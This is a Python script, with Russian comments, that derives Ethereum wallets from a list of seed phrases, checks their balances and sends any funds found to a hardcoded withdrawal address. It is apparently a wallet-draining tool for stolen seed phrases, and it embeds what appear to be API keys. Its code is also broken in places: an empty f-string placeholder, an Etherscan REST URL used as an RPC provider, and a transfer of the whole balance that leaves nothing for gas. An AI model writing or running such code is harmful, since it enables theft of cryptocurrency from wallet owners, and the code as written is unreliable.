import asyncio
import random
from eth_utils import is_hex_address
from web3 import Web3
from eth_account import Account

async def check_seed_phrase(seed_phrase, blockchain_api_key, withdrawal_address=None):
    try:
        if not isinstance(seed_phrase, str) or len(seed_phrase) == 0:
            print(f"Error: Invalid seed phrase: {seed_phrase}")
            return None

        # Восстановление приватного ключа из seed phrase
        acct = Account.from_mnemonic(seed_phrase)
        address = acct.address

        if not address:
            print(f"Error: Could not derive address from seed phrase: {seed_phrase}")
            return None

        balance = await get_wallet_balance(address, blockchain_api_key)

        if balance is not None:
            print(f"Wallet balance {address}: {balance} for seed phrase: {seed_phrase}")
            if balance > 0 and withdrawal_address:
                await request_withdrawal(acct.key, withdrawal_address, balance, blockchain_api_key)
            return balance
        else:
            print(f"Failed to get wallet balance for seed phrase: {seed_phrase}")
            return None
    except Exception as error:
        print(f"An error occurred: {error} for seed phrase: {seed_phrase}")
        return None

async def get_wallet_balance(address, api_key):
    w3 = Web3(Web3.HTTPProvider(f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey={}"))
    balance_wei = w3.eth.get_balance(address)
    balance_eth = w3.from_wei(balance_wei, 'ether')
    return balance_eth

async def request_withdrawal(private_key, destination_address, amount, api_key=None):
    w3 = Web3(Web3.HTTPProvider("https://mainnet.infura.io/v3/b2b4096796554ad78060916bbfeff33a")) # Замените на свой ID проекта Infura
    acct = Account.from_key(private_key)
    nonce = w3.eth.get_transaction_count(acct.address)

    tx = {
        'nonce': nonce,
        'to': destination_address,
        'value': w3.to_wei(amount, 'ether'),
        'gas': 21000,
        'gasPrice': w3.eth.gas_price,
    }

    signed_tx = w3.eth.account.sign_transaction(tx, private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    print(f"Withdrawal request sent. Transaction hash: {tx_hash.hex()}")


async def check_seed_phrases(seed_phrases, blockchain_api_key, withdrawal_address=None):
    results = {}
    tasks = [check_seed_phrase(seed_phrase, blockchain_api_key, withdrawal_address) for seed_phrase in seed_phrases]
    balances = await asyncio.gather(*tasks)

    for i, seed_phrase in enumerate(seed_phrases):
        results[seed_phrase] = balances[i]

    return results

async def main():
    seed_phrases = [ ]
    withdrawal_address = "0xfd82661cB0129eD746aa2B9174122c550FF84e67"
    blockchain_api_key = "cTW99jhZ19QmTNDFtP2T0BuFnX8p56en"

    results = await check_seed_phrases(seed_phrases, blockchain_api_key, withdrawal_address)

    print("Check results:")
    for seed_phrase, balance in results.items():
        print(f"Seed phrase: {seed_phrase}, Balance: {balance}")

if __name__ == "__main__":
    asyncio.run(main())

